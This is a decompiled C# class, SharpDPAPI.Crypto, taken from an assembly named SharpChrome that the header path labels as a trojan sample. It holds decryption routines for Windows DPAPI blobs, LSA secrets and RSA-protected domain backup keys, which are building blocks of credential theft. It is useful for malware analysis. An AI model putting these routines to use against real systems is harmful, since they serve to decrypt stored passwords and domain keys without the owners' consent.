// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.Crypto
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using System;
using System.Security.Cryptography;

namespace SharpDPAPI
{
  public class Crypto
  {
    public static byte[] DecryptBlob(
      byte[] ciphertext,
      byte[] key,
      int algCrypt = 26115,
      PaddingMode padding = PaddingMode.Zeros)
    {
      if (algCrypt == 26115)
      {
        TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
        byte[] numArray = new byte[8];
        cryptoServiceProvider.Key = key;
        cryptoServiceProvider.IV = numArray;
        cryptoServiceProvider.Mode = CipherMode.CBC;
        cryptoServiceProvider.Padding = padding;
        return cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length);
      }
      if (algCrypt != 26128)
        return new byte[0];
      AesManaged aesManaged = new AesManaged();
      byte[] numArray1 = new byte[16];
      aesManaged.Key = key;
      aesManaged.IV = numArray1;
      aesManaged.Mode = CipherMode.CBC;
      aesManaged.Padding = padding;
      return aesManaged.CreateDecryptor().TransformFinalBlock(ciphertext, 0, ciphertext.Length);
    }

    public static byte[] DeriveKey(byte[] keyBytes, byte[] saltBytes, int algHash = 32772)
    {
      switch (algHash)
      {
        case 32772:
          HMACSHA1 hmacshA1 = new HMACSHA1(keyBytes);
          byte[] buffer1 = new byte[64];
          byte[] buffer2 = new byte[64];
          byte[] buffer3 = saltBytes;
          byte[] hash = hmacshA1.ComputeHash(buffer3);
          for (int index = 0; index < 64; ++index)
          {
            buffer1[index] = Convert.ToByte('6');
            buffer2[index] = Convert.ToByte('\\');
          }
          for (int index = 0; index < keyBytes.Length; ++index)
          {
            buffer1[index] ^= hash[index];
            buffer2[index] ^= hash[index];
          }
          using (SHA1Managed shA1Managed = new SHA1Managed())
            return Helpers.Combine(shA1Managed.ComputeHash(buffer1), shA1Managed.ComputeHash(buffer2));
        case 32782:
          return new HMACSHA512(keyBytes).ComputeHash(saltBytes);
        default:
          return new byte[0];
      }
    }

    public static byte[] AESDecrypt(byte[] key, byte[] IV, byte[] data)
    {
      AesManaged aesManaged = new AesManaged();
      aesManaged.Key = key;
      if (IV.Length != 0)
        aesManaged.IV = IV;
      aesManaged.Mode = CipherMode.CBC;
      return aesManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
    }

    public static byte[] LSAAESDecrypt(byte[] key, byte[] data)
    {
      AesManaged aesManaged = new AesManaged();
      aesManaged.Key = key;
      aesManaged.IV = new byte[16];
      aesManaged.Mode = CipherMode.CBC;
      aesManaged.BlockSize = 128;
      aesManaged.Padding = PaddingMode.Zeros;
      ICryptoTransform decryptor = aesManaged.CreateDecryptor();
      int int32 = Decimal.ToInt32(Math.Ceiling((Decimal) data.Length / 16M));
      byte[] destinationArray = new byte[int32 * 16];
      for (int index = 0; index < int32; ++index)
      {
        int sourceIndex = index * 16;
        byte[] numArray = new byte[16];
        Array.Copy((Array) data, sourceIndex, (Array) numArray, 0, 16);
        Array.Copy((Array) decryptor.TransformFinalBlock(numArray, 0, numArray.Length), 0, (Array) destinationArray, index * 16, 16);
      }
      return destinationArray;
    }

    public static byte[] RSADecrypt(byte[] privateKey, byte[] dataToDecrypt)
    {
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(new CspParameters(24)))
      {
        try
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
          cryptoServiceProvider.ImportCspBlob(privateKey);
          byte[] numArray = new byte[256];
          Buffer.BlockCopy((Array) dataToDecrypt, 0, (Array) numArray, 0, dataToDecrypt.Length);
          Array.Reverse((Array) numArray);
          return cryptoServiceProvider.Decrypt(numArray, false);
        }
        catch (Exception ex)
        {
          Console.WriteLine("Error decryption domain key: {0}", (object) ex.Message);
        }
        finally
        {
          cryptoServiceProvider.PersistKeyInCsp = false;
          cryptoServiceProvider.Clear();
        }
      }
      return new byte[0];
    }

    public static byte[] LSASHA256Hash(byte[] key, byte[] rawData)
    {
      using (SHA256 shA256 = SHA256.Create())
      {
        byte[] numArray = new byte[key.Length + rawData.Length * 1000];
        Array.Copy((Array) key, 0, (Array) numArray, 0, key.Length);
        for (int index = 0; index < 1000; ++index)
          Array.Copy((Array) rawData, 0, (Array) numArray, key.Length + index * rawData.Length, rawData.Length);
        return shA256.ComputeHash(numArray);
      }
    }
  }
}
